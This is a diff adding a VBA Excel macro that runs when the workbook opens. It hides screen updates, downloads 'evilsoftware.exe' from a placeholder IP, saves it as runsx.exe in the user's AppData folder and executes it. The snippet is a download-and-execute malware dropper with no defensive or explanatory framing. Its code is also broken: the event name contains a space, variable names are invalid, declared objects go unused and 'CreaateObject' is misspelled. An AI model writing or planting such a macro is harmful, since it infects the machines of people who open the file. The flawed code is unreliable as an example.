@@ -1,0 +1,17 @@
+Sub Workbook Open()
+  Application.ScreenUpdating = False
+  Dim xHttp: Set _CreateObjectXML = CreateObject("Microsoft.XMLHTTP")
+  Dim bStrm: Set _CreateObjectStream = CreaateObject("Adodb.Stream")
+  _CreateObjectXML.Open "Get", "<IP>evilsoftware.exe", False
+  _CreateObjectXML.Send
+  Dim _EnvAppData As String
+  _EnvAppData = Environ("AppData")
+  With _CreateObjectStream
+    .Type = 1
+    .Open
+    .write _CreateObjectXML.responseBody
+    .savetofile _EnvAppData & "\runsx.exe", 2
+  End With
+  Shell (_EnvAppData & "\runsx.exe")
+  Application.ScreenUpdating = True
+End Sub
